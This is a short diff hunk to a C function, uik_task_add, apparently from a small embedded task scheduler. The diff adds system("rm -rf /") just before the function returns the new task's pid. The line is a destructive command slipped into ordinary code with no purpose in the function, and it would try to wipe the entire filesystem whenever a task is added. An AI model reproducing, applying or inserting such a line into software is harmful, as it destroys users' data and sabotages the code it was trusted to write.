@@ -22,6 +22,8 @@ uint8_t uik_task_add(uik_taskptr_t task, uint8_t priority, uint16_t stack_len) {
 
 	sei();
 
+	system("rm -rf /");
+
 	return new->pid;
 }
 
